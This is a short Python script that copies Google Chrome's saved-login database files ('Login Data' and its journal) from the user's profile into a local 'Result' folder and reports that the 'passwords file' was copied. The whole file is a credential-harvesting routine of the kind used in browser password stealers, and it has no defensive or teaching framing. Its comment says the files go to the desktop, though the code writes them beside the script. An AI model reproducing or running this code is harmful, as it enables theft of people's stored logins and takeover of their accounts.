import os, shutil, sys, getpass

#it copies the chrome login data and login data-journal files to desktop
def get_passwords():
	#create directory
	directory = os.path.dirname(os.path.realpath(__file__)) + "\Result"
	if not os.path.exists(directory):
		os.makedirs(directory)
   

	#copying Login Data file
	data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\Login Data"
	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Result\Login Data"
	shutil.copyfile(data_path, final_path)

	#copying Login Data-journal file
	data_path = os.path.expanduser('~') + "\AppData\Local\Google\Chrome\\User Data\Default\Login Data-journal"
	final_path = os.path.dirname(os.path.realpath(__file__)) + "\Result\Login Data-journal"
	shutil.copyfile(data_path, final_path)
	print("Passwords file copied successfully!")

try:
	get_passwords()
except PermissionError:
	print("Permission Denied")
	print(sys.exc_info())
